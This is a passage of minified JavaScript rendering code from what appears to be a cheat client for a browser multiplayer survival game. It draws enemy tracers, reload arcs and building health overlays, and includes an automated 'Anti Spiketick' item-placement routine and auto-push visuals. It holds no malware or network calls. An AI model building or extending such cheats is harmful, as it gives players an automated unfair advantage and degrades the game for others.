            for (var i = -Re; i < se; i += re / gridWay) i > 0 && (M.moveTo(i, 0), M.lineTo(i, re));
            for (let a = -_e; a < re; a += re / gridWay) i > 0 && (M.moveTo(0, a), M.lineTo(se, a));
            M.stroke();
        }
        (M.globalAlpha = 1),
            (M.strokeStyle = ei),
            renderDeadPlayers(p, f),
            (M.strokeStyle = ei),
            zt(-1, p, f),
            (M.globalAlpha = 1),
            (M.lineWidth = 5.5),
            br(0, p, f),
            Ir(p, f, 0),
            (M.globalAlpha = 1);
        for (var c = 0; c < ye.length; ++c)
            (y = ye[c]).active &&
                y.visible &&
                (y.animate(be),
                 M.save(),
                 M.translate(y.x - p, y.y - f),
                 M.rotate(y.dir + y.dirPlus - Math.PI / 2),
                 Jf(y, M),
                 M.restore());
        if (
            (zt(0, p, f),
             br(1, p, f),
             zt(1, p, f),
             Ir(p, f, 1),
             zt(2, p, f),
             zt(3, p, f),
             (M.fillStyle = "#000"),
             (M.globalAlpha = 0.18),
             p <= 0 && M.fillRect(0, 0, -p, re),
             T.mapScale - p <= se)
        ) {
            var $ = Math.max(0, -f);
            M.fillRect(T.mapScale - p, $, se - (T.mapScale - p), re - $);
        }
        if ((f <= 0 && M.fillRect(-p, 0, se + p, -f), T.mapScale - f <= re)) {
            var g = Math.max(0, -p);
            let m = 0;
            T.mapScale - p <= se && (m = se - (T.mapScale - p)),
                M.fillRect(g, T.mapScale - f, se - g - m, re - (T.mapScale - f));
        }
        (M.globalAlpha = 1),
            (M.fillStyle = rgbagamec),
            M.fillRect(0, 0, se, re),
            (M.strokeStyle = kr);
        //here
        for (var c = 0; c < J.length + ye.length; ++c)
            if (
                (y = J[c] || ye[c - J.length]).visible &&
                (y.isPlayer || !y.isPlayer || y == E || (y.team && y.team == E.team))
            ) {
                let _ = (y.team ? "[" + y.team + "] " : "") + (y.name || "");
                if (
                    (Oe.forEach,
                     Oe.forEach((t) => {
                        (t = t.sid),
                            teamz.includes(t) ||
                            (teamz.push(t),
                             addMenuChText(
                            "new clan " +
                            t +
                            (null != _i(t.owner)
                             ? " with owner " + _i(t.owner).name
                             : ""),
                            "pink",
                            "",
                            "turquoise"
                        ));
                    }),
                     teamz.includes(y.team) ||
                     void 0 == y.team ||
                     null == y.team ||
                     (teamz.push(y.team),
                      addMenuChText("new clan " + y.team, "white", "KTA", "turquoise")),
                     "" != _)
                ) {
                    if (
                        ((M.strokeStyle = "#000000"),
                         (M.font = gla
                          ? (y.nameScale || 30) + "px Hammersmith One"
                          : "bold " + (y.nameScale || 30) + "px Oxygen"),
                         (M.fillStyle = "#fff"),
                         (M.textBaseline = "middle"),
                         (M.textAlign = "center"),
                         (M.lineWidth = y.nameScale ? 11 : 8),
                         (M.lineJoin = "round"),
                         M.strokeText(_, y.x - p, y.y - f - y.scale - T.nameY),
                         M.fillText(_, y.x - p, y.y - f - y.scale - T.nameY),
                         y.isPlayer &&
                         ((M.lineWidth = 8),
                          (M.fillStyle = "#fff" == y.dmgColor ? "#8ecc51" : y.dmgColor),
                          (M.font = gla ? "18px Hammersmith One" : "bold 18px Oxygen"),
                          M.strokeText(y.sid, y.x - p, y.y - f - y.scale + 35),
                          M.fillText(y.sid, y.x - p, y.y - f - y.scale + 35),
                          (M.font = gla ? "24px Hammersmith One" : "bold 24px Oxygen"),
                          (M.lineWidth = 6),
                          (M.fillStyle = "#fff"),
                          M.strokeText(y.shameCount, y.x - p, y.y - f - y.scale + 140),
                          M.fillText(y.shameCount, y.x - p, y.y - f - y.scale + 140)),
                         y.isLeader && Vt.crown.isLoaded)
                    ) {
                        var k = T.crownIconScale,
                            g = y.x - p - k / 2 - M.measureText(_).width / 2 - T.crownPad - 5;
                        M.drawImage(
                            Vt.crown,
                            g,
                            y.y - f - y.scale - T.nameY - k / 2 - 5,
                            k,
                            k
                        );
                    }
                    let v = {
                        lineJoin: M.lineJoin,
                        globalAlpha: M.globalAlpha,
                        strokeStyle: M.strokeStyle,
                        fillStyle: M.fillStyle,
                    },
                        b = y.dir,
                        w = I(y.x, y.y, b, y.scale + 35),
                        x = I(w.x, w.y, b + P(40), -25),
                        S = I(w.x, w.y, b - P(40), -25);

                    function I(t, n, i, o) {
                        return {
                            x: (t += o * Math.cos(i)),
                            y: (n += o * Math.sin(i)),
                        };
                    }

                    function P(t) {
                        return t * (Math.PI / 180);
                    }
                    for (let O in ((M.fillStyle = "#000"),
                                   M.beginPath(),
                                   (M.globalAlpha = 0.35),
                                   M.moveTo(w.x - p, w.y - f),
                                   M.lineTo(x.x - p, x.y - f),
                                   M.lineTo(S.x - p, S.y - f),
                                   M.closePath(),
                                   M.fill(),
                                   (M.globalAlpha = 0.6),
                                   v))
                        M[O] = v[O];
                    if (y == enemy && Vt.inztaTarget.isLoaded && inztakillData.toggle) {
                        var A = 5 * y.scale;
                        M.drawImage(Vt.inztaTarget, y.x - p - A / 2, y.y - f - A / 2, A, A);
                    }
                    if (
                        (y.alive &&
                         y.isPlayer &&
                         document.getElementById("healthanim").checked &&
                         y.health != y.healthAnim &&
                         (y.health < y.healthAnim
                          ? (y.healthAnim -= 4.5)
                          : (y.healthAnim += 4.5),
                          4.5 > Math.abs(y.health - y.healthAnim) &&
                          (y.healthAnim = y.health)),
                         E &&
                         E.alive &&
                         y.isPlayer &&
                         y.isPlayer &&
                         !E.isTeam(y) &&
                         void 0 != y.weaponIndex &&
                         0 == y.reloads[y.weaponIndex]) &&
                         y.preplaceAble
                    ) {
                        let B =
                            R.weapons[y.weaponIndex].dmg *
                            T.weaponVariants[
                                y[(y.weaponIndex < 9 ? "prima" : "zeconda") + "ryVariant"]
                            ].val *
                            (R.weapons[y.weaponIndex].sDmg || 1) *
                            (40 == y.skinIndex ? 3.3 : 1),
                            D = et
                        .filter(
                            (t) =>
                            t.active &&
                            cdf(t, y) <=
                            R.weapons[y.weaponIndex].range + 35 + t.scale &&
                            cdf(t, E) <= E.scale + t.scale + t.scale + E.scale &&
                            t.health - B <= 0 &&
                            C.getAngleDist(
                                caf(
                                    {
                                        x: y.x2,
                                        y: y.y2,
                                    },
                                    {
                                        x: t.x,
                                        y: t.y,
                                    }
                                ),
                                y.dir
                            ) <=
                            Math.PI / 2.6
                        )
                        .sort(function (t, n) {
                            return cdf(t, y) - cdf(n, y);
                        });
                        D.length
                            ? D.forEach((t) => {
                            place(2, caf(E, y));
                            6 != E.skinIndex &&
                                E.alive &&
                                ((forceZolder = !0),
                                 addMenuChText("Anti Spiketick", "yellow", "", "yellow")),
                                setTickout(() => {
                                forceZolder = !1;
                            }, 2);
                        }) : null;
                    }
                    if (
                        document.getElementById("tracer").checked &&
                        !E.isTeam(y) &&
                        y.isPlayer
                    ) {
                        if ("Line" == document.getElementById("tracerType").value)
                            (M.lineWidth = 4),
                                (M.globalAlpha = 1),
                                M.beginPath(),
                                (M.font = gla ? "24px Hammersmith One" : "bold 24px Oxygen"),
                                (M.strokeStyle = "black"),
                                (M.fillStyle = "white"),
                                M.moveTo(E.x - p, E.y - f),
                                M.lineTo(y.x - p, y.y - f),
                                M.stroke(),
                                M.strokeText(
                                cdf(E, y),
                                (E.x + y.x) / 2 - p,
                                (E.y + y.y) / 2 - f
                            ),
                                M.fillText(cdf(E, y), (E.x + y.x) / 2 - p, (E.y + y.y) / 2 - f);
                        else if ("Arrow" == document.getElementById("tracerType").value) {
                            let z = {
                                x: T.maxScreenWidth / 2,
                                y: T.maxScreenHeight / 2,
                            },
                                W = Math.min(
                                    1,
                                    (100 *
                                     cdf(
                                        {
                                            x: 0,
                                            y: 0,
                                        },
                                        {
                                            x: E.x - y.x,
                                            y: (E.y - y.y) * (16 / 9),
                                        }
                                    )) /
                                    (T.maxScreenHeight / 2) /
                                    z.y
                                ),
                                L = Math.max(100, z.y * W),
                                H = L * Math.cos(caf(E, y)),
                                V = L * Math.sin(caf(E, y));
                            M.save(),
                                M.translate(E.x - p + H, E.y - f + V),
                                M.rotate(caf(E, y) + Math.PI / 2),
                                (M.fillStyle = y.dmgColor),
                                (M.globalAlpha = 1),
                                !(function (t, n) {
                                let i = t * (Math.sqrt(3) / 2);
                                (n = n || M).beginPath(),
                                    n.moveTo(0, -i / 1.5),
                                    n.lineTo(-t / 2, i / 2),
                                    n.lineTo(t / 2, i / 2),
                                    n.lineTo(0, -i / 1.5),
                                    n.fill(),
                                    n.closePath();
                            })(25, M),
                                M.restore();
                        }
                    }
                    if (1 == y.iconIndex && Vt.skull.isLoaded) {
                        var k = T.crownIconScale,
                            g = y.x - p - k / 2 + M.measureText(_).width / 2 + T.crownPad;
                        M.drawImage(
                            Vt.skull,
                            g,
                            y.y - f - y.scale - T.nameY - k / 2 - 5,
                            k,
                            k
                        );
                    }
                }

                function F(t, n, i) {
                    return `hsl(${(i - n) * (t / 100) + n}, 30%, 50%)`;
                }

                function U(t) {
                    return `hsl(${360 * t + 70}, 100%, 50%)`;
                }
                y.health > 0 &&
                    (T.healthBarWidth,
                     (M.fillStyle = kr),
                     M.roundRect(
                    y.x - p - T.healthBarWidth - T.healthBarPad,
                    y.y - f + y.scale + T.nameY,
                    2 * T.healthBarWidth + 2 * T.healthBarPad,
                    17,
                    8
                ),
                     M.fill(),
                     y.isPlayer &&
                     document.getElementById("healthanim").checked &&
                     ((M.fillStyle = "rgba(255, 255, 0, 0.75)"),
                      M.roundRect(
                    y.x - p - T.healthBarWidth,
                    y.y - f + y.scale + T.nameY + T.healthBarPad,
                    2 * T.healthBarWidth * (y.healthAnim / y.maxHealth),
                    17 - 2 * T.healthBarPad,
                    7
                ),
                      M.fill()),
                     (M.fillStyle =
                      y == E || (y.team && y.team == E.team) ? "#8ecc51" : "#cc5151"),
                     M.roundRect(
                    y.x - p - T.healthBarWidth,
                    y.y - f + y.scale + T.nameY + T.healthBarPad,
                    2 * T.healthBarWidth * (y.health / y.maxHealth),
                    17 - 2 * T.healthBarPad,
                    7
                ),
                     M.fill());
                let N = {
                    primary:
                    void 0 == y.primaryWeapon
                    ? 1
                    : (R.weapons[y.primaryWeapon].speed -
                       y.reloads[y.primaryWeapon]) /
                    R.weapons[y.primaryWeapon].speed,
                    secondary:
                    void 0 == y.secondaryWeapon
                    ? 1
                    : (R.weapons[y.secondaryWeapon].speed -
                       y.reloads[y.secondaryWeapon]) /
                    R.weapons[y.secondaryWeapon].speed,
                    turret: (2500 - y.turretReload) / 2500,
                };
                y.currentReloads ||
                    (y.currentReloads = {
                    primary: N.primary,
                    secondary: N.secondary,
                    turret: N.turret,
                });
                let q = {
                    primary:
                    void 0 == y.primaryWeapon
                    ? 1
                    : y.oldReloads[y.primaryWeapon] -
                    (y.oldReloads[y.primaryWeapon] - y.reloads[y.primaryWeapon]) *
                    y.rt,
                    secondary:
                    void 0 == y.secondaryWeapon
                    ? 1
                    : y.oldReloads[y.secondaryWeapon] -
                    (y.oldReloads[y.secondaryWeapon] -
                     y.reloads[y.secondaryWeapon]) *
                    y.rt,
                };
                (y.currentReloads.primary =
                 void 0 == y.primaryWeapon
                 ? 1
                 : (R.weapons[y.primaryWeapon].speed - q.primary) /
                 R.weapons[y.primaryWeapon].speed),
                    (y.currentReloads.secondary =
                     void 0 == y.secondaryWeapon
                     ? 1
                     : (R.weapons[y.secondaryWeapon].speed - q.secondary) /
                     R.weapons[y.secondaryWeapon].speed),
                    (y.currentReloads.turret = N.turret),
                    void 0 !== y.primaryWeapon &&
                    (R.weapons[y.primaryWeapon].speed,
                     y.reloads[y.primaryWeapon],
                     R.weapons[y.primaryWeapon].speed),
                    void 0 !== y.secondaryWeapon &&
                    (R.weapons[y.secondaryWeapon].speed,
                     y.reloads[y.secondaryWeapon],
                     R.weapons[y.secondaryWeapon].speed);
                let X = y.x - p,
                    Y = y.y - f,
                    G = (2 * Math.PI) / 3,
                    K = -Math.PI / 2 + Math.PI / 3 - Math.PI / 12,
                    Z = K + G * y.currentReloads.secondary,
                    ed = Math.PI / 2,
                    ep = ed + G * y.currentReloads.primary + Math.PI / 12,
                    e$ = Math.PI + Math.PI / 4.5,
                    eg = e$ + (G / 1.3) * y.currentReloads.turret;
                M.save(),
                    1 != y.currentReloads.primary &&
                    (M.beginPath(),
                     M.arc(X, Y, 35, ed, ep),
                     (M.lineWidth = 5.5),
                     (M.strokeStyle = U(
                    y.currentReloads.primary,
                    R.weapons[y.primaryWeapon].speed
                )),
                     M.stroke()),
                    1 != y.currentReloads.secondary &&
                    (M.beginPath(),
                     M.arc(X, Y, 35, K, Z),
                     (M.lineWidth = 5.5),
                     (M.strokeStyle = U(
                    y.currentReloads.secondary,
                    R.weapons[y.secondaryWeapon].speed
                )),
                     M.stroke()),
                    1 != y.currentReloads.turret &&
                    (M.beginPath(),
                     M.arc(X, Y, 35, e$, eg),
                     (M.lineWidth = 5.5),
                     (M.strokeStyle = U(y.currentReloads.turret, 2500)),
                     M.stroke()),
                    M.restore();
            }
        E &&
            autopuzhing &&
            ((M.lineWidth = 2),
             (M.globalAlpha = 1),
             M.beginPath(),
             (M.strokeStyle = "white"),
             M.moveTo(E.x - p, E.y - f),
             M.lineTo(puzhData.x2 - p, puzhData.y2 - f),
             M.lineTo(puzhData.x - p, puzhData.y - f),
             M.stroke(),
             M.beginPath(),
             (M.strokeStyle = "blue"),
             M.moveTo(E.x - p, E.y - f),
             M.lineTo((E.x + 70 * Math.cos(pushTragectory)) - p, (E.y + 70 * Math.sin(pushTragectory)) - f),
             M.stroke()),
            et.forEach((t) => {
            if (
                (t.active &&
                 t.isItem &&
                 650 >= cdf(t, E) &&
                 document.getElementById("objzid").checked &&
                 ((M.font = gla ? "12px Hammersmith One" : "bold 12px Oxygen"),
                  (M.fillStyle = t.teamObj(E) ? "#2187C0" : "#c22157"),
                  (M.textBaseline = "middle"),
                  (M.textAlign = "center"),
                  (M.strokeStyle = "#000000"),
                  (M.lineWidth = 8),
                  (M.lineJoin = "round"),
                  M.strokeText(
                    t.owner.sid,
                    t.x - p + t.xWiggle,
                    t.y - f + 25 + t.yWiggle
                ),
                  M.fillText(
                    t.owner.sid,
                    t.x - p + t.xWiggle,
                    t.y - f + 25 + t.yWiggle
                )),
                 t.active &&
                 t.isItem &&
                 400 >= cdf(t, E) &&
                 t.health < t.maxHealth &&
                 document.getElementById("buildhp").checked)
            ) {
                if ("Rectangle" == document.getElementById("buildHPType").value)
                    T.healthBarWidth,
                        (M.fillStyle = "#000000"),
                        M.roundRect(
                        t.x +
                        t.xWiggle -
                        p -
                        (T.healthBarWidth / 2) * 1.25 -
                        T.healthBarPad,
                        t.y + t.yWiggle - f - 10,
                        1.25 * T.healthBarWidth + 2 * T.healthBarPad,
                        17,
                        8
                    ),
                        M.fill(),
                        (M.fillStyle = t.teamObj(E) ? "#2187C0" : "#c22157"),
                        M.roundRect(
                        t.x + t.xWiggle - p - (T.healthBarWidth / 2) * 1.25,
                        t.y + t.yWiggle - f + T.healthBarPad - 10,
                        1.25 * T.healthBarWidth * (t.health / t.maxHealth),
                        17 - 2 * T.healthBarPad,
                        7
                    ),
                        M.fill();
                else if ("Circle" == document.getElementById("buildHPType").value) {
                    let n = T.healthBarWidth / 2 + T.healthBarPad - 5,
                        i = 1e-4 - t.health / t.maxHealth + 1;
                    M.beginPath(),
                        M.arc(
                        t.x - p,
                        t.y - f,
                        n,
                        Math.PI,
                        Math.PI + 2 * i * Math.PI,
                        !0
                    ),
                        (M.strokeStyle = "#000"),
                        (M.lineWidth = 14),
                        (M.lineCap = "round"),
                        M.stroke(),
                        M.beginPath(),
                        M.arc(
                        t.x - p,
                        t.y - f,
                        n,
                        Math.PI,
                        Math.PI + 2 * i * Math.PI,
                        !0
                    ),
                        (M.strokeStyle = t.teamObj(E) ? "#2187C0" : "#c22157"),
                        (M.lineWidth = 6),
                        (M.lineCap = "round"),
                        M.stroke();
                }
            }
        }),
            Hn.update(be, M, p, f);
        for (var c = 0; c < J.length; ++c)
            if ((y = J[c]).visible && y.chatCountdown > 0) {
                (y.chatCountdown -= be),
                    y.chatCountdown <= 0 && (y.chatCountdown = 0),
                    (M.font = gla ? "32px Hammersmith One" : "bold 32px Oxygen");
                let em = M.measureText(y.chatMessage);
                (M.textBaseline = "middle"), (M.textAlign = "center");
                var g = y.x - p,
                    $ = y.y - y.scale - f - 90;
                let ey = em.width + 17;
                (M.fillStyle = "rgba(0,0,0,0.2)"),
                    M.roundRect(g - ey / 2, $ - 23.5, ey, 47, 6),
                    M.fill(),
                    (M.fillStyle = "#fff"),
                    M.fillText(y.chatMessage, g, $);
            }
        for (var c = 0; c < J.length; ++c)
            if ((y = J[c]).visible && y.privateChatCountdown > 0) {
                (y.privateChatCountdown -= be),
                    y.privateChatCountdown <= 0 && (y.privateChatCountdown = 0),
                    (M.font = gla ? "32px Hammersmith One" : "bold 32px Oxygen");
                let e_ = M.measureText(y.privateChatMessage);
                (M.textBaseline = "middle"), (M.textAlign = "center");
                var g = y.x - p,
                    $ = y.y - y.scale - f - 90;
                let ek = e_.width + 17;
                (M.fillStyle = "rgba(0,0,0,0.2)"),
                    M.roundRect(g - ek / 2, $ - 23.5, ek, 47, 6),
                    M.fill(),
                    (M.fillStyle = "#bdbdbd"),
                    M.fillText(y.privateChatMessage, g, $);
            }
    }
    lf(be);
}

function br(t, n, i) {
    for (let o = 0; o < Mt.length; ++o)
        (y = Mt[o]).active &&
            y.layer == t &&
            (y.update(be),
             y.active &&
             Bo(y.x - n, y.y - i, y.scale) &&
             (M.save(),
              M.translate(y.x - n, y.y - i),
              M.rotate(y.dir),
              Zn(0, 0, y, M),
              M.restore()));
}
const Sr = {};

function Zn(t, n, i, o, a) {
    if (i.src) {
        let r = R.projectiles[i.indx].src,
            s = Sr[r];
        s ||
            (((s = new Image()).onload = function () {
            this.isLoaded = !0;
        }),
             (s.src = "./img/weapons/" + r + ".png"),
             (Sr[r] = s)),
            s.isLoaded &&
            o.drawImage(s, t - i.scale / 2, n - i.scale / 2, i.scale, i.scale);
    } else 1 == i.indx && ((o.fillStyle = "#939393"), Q(t, n, i.scale, o));
}

function Rf() {
    let t = Re - se / 2,
        n = _e - re / 2;
    (Me.animationTime += be), (Me.animationTime %= T.volcanoAnimationDuration);
    let i = T.volcanoAnimationDuration / 2,
        o = 1.7 + 0.3 * (Math.abs(i - Me.animationTime) / i),
        a = T.innerVolcanoScale * o;
    M.drawImage(
        Me.land,
        Me.x - T.volcanoScale - t,
        Me.y - T.volcanoScale - n,
        2 * T.volcanoScale,
        2 * T.volcanoScale
    ),
        M.drawImage(Me.lava, Me.x - a - t, Me.y - a - n, 2 * a, 2 * a);
}

function Tr(t, n, i, o) {
    let a = T.riverWidth + o,
        r = T.mapScale / 2 - n - a / 2;
    r < re && r + a > 0 && i.fillRect(0, r, se, a);
}

function zt(t, n, i) {
    let o, a, r;
    for (let s = 0; s < et.length; ++s)
        (y = et[s]).active &&
            ((a = y.x + y.xWiggle - n),
             (r = y.y + y.yWiggle - i),
             0 == t && y.update(be),
             y.layer == t &&
             Bo(a, r, y.scale + (y.blocker || 0)) &&
             ((M.globalAlpha = y.hideFromEnemy ? 0.6 : 1),
              y.isItem
              ? ((o = Ss(y)),
                 M.save(),
                 M.translate(a, r),
                 M.rotate(y.dir),
                 M.drawImage(o, -(o.width / 2), -(o.height / 2)),
                 y.blocker &&
                 ((M.strokeStyle = "#db6e6e"),
                  (M.globalAlpha = 0.3),
                  (M.lineWidth = 6),
                  Q(0, 0, y.blocker, M, !1, !0)),
                 M.restore())
              : 4 === y.type
              ? Rf()
              : ((o = Hf(y)), M.drawImage(o, a - o.width / 2, r - o.height / 2))));
    if (
        (document.getElementById("placevizual").checked &&
         "Building" == document.getElementById("placevizualType").value &&
         3 == t &&
         itemPlacer.length &&
         itemPlacer.forEach((t) => {
            let o = t.x - n,
                a = t.y - i;
            getMarkSprite(t, M, o, a);
        }),
         3 == t && breakMarker.length)
    ) {
        let l = breakMarker[0],
            c = breakMarker[1];
        M.beginPath(),
            (M.globalAlpha = 0.35),
            (M.fillStyle = "red"),
            (M.strokeStyle = _i(breakMarker[3])
             ? breakMarker[3] == E.sid
             ? "red"
             : _i(breakMarker[3]).dmgColor
             : "red"),
            M.arc(l - n, c - i, breakMarker[2], 0, 2 * Math.PI),
            M.stroke(),
            M.fill(),
            (M.globalAlpha = 1),
            (M.fillStyle = ""),
            (M.strokeStyle = "");

        if(antiPushobj) {
            M.beginPath(),
                (M.globalAlpha = 0.35),
                (M.fillStyle = "blue"),
                (M.strokeStyle = "#00aaee"),
                M.arc(l - n, c - i, antiPushobj.scale, 0, 2 * Math.PI),
                M.stroke(),
                M.fill(),
                (M.globalAlpha = 1),
                (M.fillStyle = ""),
                (M.strokeStyle = "");
        }
    }
}
let outlineColor = "#525252",
    darkOutlineColor = "#3d3f42",
    outlineWidth = 5.5;

function renderCircle(t, n, i, o, a, r) {
    (o = o || M).beginPath(),
        o.arc(t, n, i, 0, 2 * Math.PI),
        r || o.fill(),
        a || o.stroke();
}

function renderHealthCircle(t, n, i, o, a, r) {
    (o = o || M).beginPath(),
        o.arc(t, n, i, 0, 2 * Math.PI),
        r || o.fill(),
        a || o.stroke();
}

function renderStar(t, n, i, o) {
    let a = (Math.PI / 2) * 3,
        r,
        s,
        l = Math.PI / n;
    t.beginPath(), t.moveTo(0, -i);
    for (let c = 0; c < n; c++)
        (r = Math.cos(a) * i),
            (s = Math.sin(a) * i),
            t.lineTo(r, s),
            (a += l),
            (r = Math.cos(a) * o),
            (s = Math.sin(a) * o),
            t.lineTo(r, s),
            (a += l);
    t.lineTo(0, -i), t.closePath();
}

function renderHealthStar(t, n, i, o) {
    let a = (Math.PI / 2) * 3,
        r,
        s,
        l = Math.PI / n;
    t.beginPath(), t.moveTo(0, -i);
    for (let c = 0; c < n; c++)
        (r = Math.cos(a) * i),
            (s = Math.sin(a) * i),
            t.lineTo(r, s),
            (a += l),
            (r = Math.cos(a) * o),
            (s = Math.sin(a) * o),
            t.lineTo(r, s),
            (a += l);
    t.lineTo(0, -i), t.closePath();
}

function renderRect(t, n, i, o, a, r, s) {
    s || a.fillRect(t - i / 2, n - o / 2, i, o),
        r || a.strokeRect(t - i / 2, n - o / 2, i, o);
}

function renderHealthRect(t, n, i, o, a, r, s) {
    s || a.fillRect(t - i / 2, n - o / 2, i, o),
        r || a.strokeRect(t - i / 2, n - o / 2, i, o);
}

function renderRectCircle(t, n, i, o, a, r, s, l) {
    r.save(), r.translate(t, n), (a = Math.ceil(a / 2));
    for (let c = 0; c < a; c++)
        renderRect(0, 0, 2 * i, o, r, s, l), r.rotate(Math.PI / a);
    r.restore();
}

function getMarkSprite(t, n, i, o) {
    if (
        ((n.lineWidth = outlineWidth),
         (M.globalAlpha = 0.25),
         (n.strokeStyle = outlineColor),
         n.save(),
         n.translate(i, o),
         n.rotate(t.dir || 0),
         "spikes" == t.name ||
         "greater spikes" == t.name ||
         "poison spikes" == t.name ||
         "spinning spikes" == t.name)
    ) {
        n.fillStyle = "poison spikes" == t.name ? "#7b935d" : "#939393";
        var a = 0.6 * t.scale;
        (n.globalCompositeOperation = "source-over"),
            renderStar(n, "spikes" == t.name ? 5 : 6, t.scale, a),
            n.fill(),
            n.stroke(),
            (n.fillStyle = "#a5974c"),
            (n.globalCompositeOperation = "source-over"),
            renderCircle(0, 0, a, n),
            (n.fillStyle = "#c9b758"),
            (n.globalCompositeOperation = "source-over"),
            renderCircle(0, 0, a / 2, n, !0);
    } else if ("turret" == t.name)
        (n.fillStyle = "#a5974c"),
            (n.globalCompositeOperation = "source-over"),
            renderCircle(0, 0, t.scale, n),
            n.fill(),
            n.stroke(),
            (n.fillStyle = "#939393"),
            (n.globalCompositeOperation = "source-over"),
            renderRect(0, -25, 0.9 * t.scale, 50, n),
            (n.globalCompositeOperation = "source-over"),
            renderCircle(0, 0, 0.6 * t.scale, n),
            n.fill(),
            n.stroke();
    else if ("teleporter" == t.name)
        (n.fillStyle = "#7e7f82"),
            (n.globalCompositeOperation = "source-over"),
            renderCircle(0, 0, t.scale, n),
            n.fill(),
            n.stroke(),
            n.rotate(Math.PI / 4),
            (n.fillStyle = "#d76edb"),
            (n.globalCompositeOperation = "source-over"),
            renderCircle(0, 0, 0.5 * t.scale, n, !0);
    else if ("platform" == t.name) {
        n.fillStyle = "#cebd5f";
        let r = 2 * t.scale,
            s = r / 4,
            l = -(t.scale / 2);
        for (let c = 0; c < 4; ++c)
            (n.globalCompositeOperation = "source-over"),
                renderRect(l - s / 2, 0, s, 2 * t.scale, n),
                n.fill(),
                n.stroke(),
                (l += r / 4);
    } else
        "healing pad" == t.name
            ? ((n.fillStyle = "#7e7f82"),
               (n.globalCompositeOperation = "source-over"),
               renderRect(0, 0, 2 * t.scale, 2 * t.scale, n),
               n.fill(),
               n.stroke(),
               (n.fillStyle = "#db6e6e"),
               (n.globalCompositeOperation = "source-over"),
               renderRectCircle(0, 0, 0.65 * t.scale, 20, 4, n, !0))
        : "spawn pad" == t.name
            ? ((n.fillStyle = "#7e7f82"),
               (n.globalCompositeOperation = "source-over"),
               renderRect(0, 0, 2 * t.scale, 2 * t.scale, n),
               n.fill(),
               n.stroke(),
               (n.fillStyle = "#71aad6"),
               (n.globalCompositeOperation = "source-over"),
               renderCircle(0, 0, 0.6 * t.scale, n))
        : "blocker" == t.name
            ? ((n.fillStyle = "#7e7f82"),
               (n.globalCompositeOperation = "source-over"),
               renderCircle(0, 0, t.scale, n),
               n.fill(),
               n.stroke(),
               n.rotate(Math.PI / 4),
               (n.fillStyle = "#db6e6e"),
               (n.globalCompositeOperation = "source-over"),
               renderRectCircle(0, 0, 0.65 * t.scale, 20, 4, n, !0))
        : "windmill" == t.name ||
            "faster windmill" == t.name ||
            "power mill" == t.name
            ? ((n.globalCompositeOperation = "source-over"),
               (n.fillStyle = "#a5974c"),
               Q(0, 0, t.scale, n),
               (n.globalCompositeOperation = "source-over"),
               (n.fillStyle = "#c9b758"),
               En(0, 0, 1.5 * t.scale, 29, 4, n),
               (n.globalCompositeOperation = "source-over"),
               (n.fillStyle = "#a5974c"),
               Q(0, 0, 0.5 * t.scale, n))
        : "pit trap" == t.name &&
            ((n.globalAlpha = 0.2),
             (n.fillStyle = "#a5974c"),
             (n.globalCompositeOperation = "source-over"),
             renderStar(n, 3, 1.1 * t.scale, 1.1 * t.scale),
             n.fill(),
             n.stroke(),
             (n.fillStyle = outlineColor),
             (n.globalCompositeOperation = "source-over"),
             renderStar(n, 3, 0.65 * t.scale, 0.65 * t.scale),
             n.fill());
    n.restore(), (n.globalAlpha = 1);
}

function Ir(t, n, i) {
    M.globalAlpha = 1;
    for (let o = 0; o < J.length; ++o)
        (y = J[o]).zIndex == i &&
            (y.animate(be),
             y.visible &&
             ((y.skinRot += 0.002 * be),
              (lr = y.dir + y.dirPlus),
              M.save(),
              M.translate(y.x - t, y.y - n),
              M.rotate(lr),
              (M.shadowColor = "rgba(0, 0, 0, 0.75)"),
              (M.shadowBlur = 10),
              (M.globalAlpha = 0.8),
              Bf(y, M),
              M.restore()));
}

function renderDeadPlayer(t, n, i, o) {
    ((n = n || M).lineWidth = 5.5), (n.lineJoin = "miter");
    let a = (Math.PI / 4) * (R.weapons[t.weaponIndex].armS || 1),
        r = (t.buildIndex < 0 && R.weapons[t.weaponIndex].hndS) || 1,
        s = (t.buildIndex < 0 && R.weapons[t.weaponIndex].hndD) || 1;
    if (
        (zf(13, n, t),
         !(t.buildIndex < 0) ||
         R.weapons[t.weaponIndex].aboveHand ||
         (Ar(
            R.weapons[t.weaponIndex],
            T.weaponVariants[t.weaponVariant || 0].src || "",
            t.scale,
            0,
            n
        ),
          void 0 == R.weapons[t.weaponIndex].projectile ||
          R.weapons[t.weaponIndex].hideProjectile ||
          Zn(t.scale, 0, R.projectiles[R.weapons[t.weaponIndex].projectile], M)),
         (n.fillStyle = "#ececec"),
         renderCircle(t.scale * Math.cos(a), t.scale * Math.sin(a), 14),
         renderCircle(
            t.scale * s * Math.cos(-a * r),
            t.scale * s * Math.sin(-a * r),
            14
        ),
         t.buildIndex < 0 &&
         R.weapons[t.weaponIndex].aboveHand &&
         (Ar(
            R.weapons[t.weaponIndex],
            T.weaponVariants[t.weaponVariant || 0].src || "",
            t.scale,
            0,
            n
        ),
          void 0 == R.weapons[t.weaponIndex].projectile ||
          R.weapons[t.weaponIndex].hideProjectile ||
          Zn(t.scale, 0, R.projectiles[R.weapons[t.weaponIndex].projectile], M)),
         t.buildIndex >= 0)
    ) {
        var l = Ss(R.list[t.buildIndex]);
        n.drawImage(l, t.scale - R.list[t.buildIndex].holdOffset, -l.width / 2);
    }
    renderCircle(0, 0, t.scale, n), lovedune2024(48, n, null, t, i, o);
}

function renderCircle(t, n, i, o, a, r) {
    (o = o || M).beginPath(),
        o.arc(t, n, i, 0, 2 * Math.PI),
        r || o.fill(),
        a || o.stroke();
}
const speed = 1;

function renderDeadPlayers(t, n) {
    M.fillStyle = "#91b2db";
    let i = Date.now();
    deadPlayers
        .filter((t) => t.active)
        .forEach((o) => {
        o.startTime ||
            ((o.startTime = i), (o.angle = 0), (o.radius = 0.1), (o.alpha = 1));
        let a = i - o.startTime;
        (o.alpha = Math.max(0, 1 - a / 3e3)),
            o.animate(be),
            (M.globalAlpha = o.alpha),
            (M.strokeStyle = ei),
            M.save(),
            M.translate(o.x - t, o.y - n),
            (o.angle += 0.05);
        let r = 500 / 9,
            s = o.radius * Math.cos(o.deathDir),
            l = o.radius * Math.sin(o.deathDir);
        (o.x += s * r),
            (o.y += l * r),
            M.rotate(o.angle),
            (M.globalAlpha = o.alpha),
            renderDeadPlayer(o, M, o.alpha, o.angle),
            M.restore(),
            (M.fillStyle = "#91b2db"),
            a >= 3e3 && ((o.active = !1), (o.startTime = null));
    });
}

function Bf(t, n) {
